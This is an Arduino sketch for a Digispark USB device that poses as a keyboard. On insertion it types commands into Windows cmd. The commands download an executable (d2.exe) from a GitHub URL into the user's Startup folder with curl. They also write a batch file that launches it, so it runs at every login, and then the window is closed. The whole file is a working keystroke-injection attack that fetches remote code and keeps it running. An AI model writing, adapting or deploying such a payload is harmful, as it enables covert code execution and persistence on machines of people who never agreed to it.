#define kbd_tr_tr // YOU HAVE TO REMOVE IT IF YOU USING ENGLISH KEYBOARD!
#include "DigiKeyboard.h"

void setup() {
  delay(1000);


  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  delay(500);


  DigiKeyboard.println("cmd");
  delay(1000);


  DigiKeyboard.println("cd \"%USERPROFILE%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup\" ");
  delay(1000);


  DigiKeyboard.println("curl -LJO https://github.com/dotesec/d2/raw/refs/heads/main/d2.exe ");
  delay(9000);


  DigiKeyboard.println("echo @echo off > r.bat ");
  delay(1000);
  DigiKeyboard.println("echo cd \"%USERPROFILE%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup\" >> r.bat ");
  delay(1000);
  DigiKeyboard.println("echo start d2.exe >> r.bat");
  delay(1000);


  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
}

void loop() {
  
}
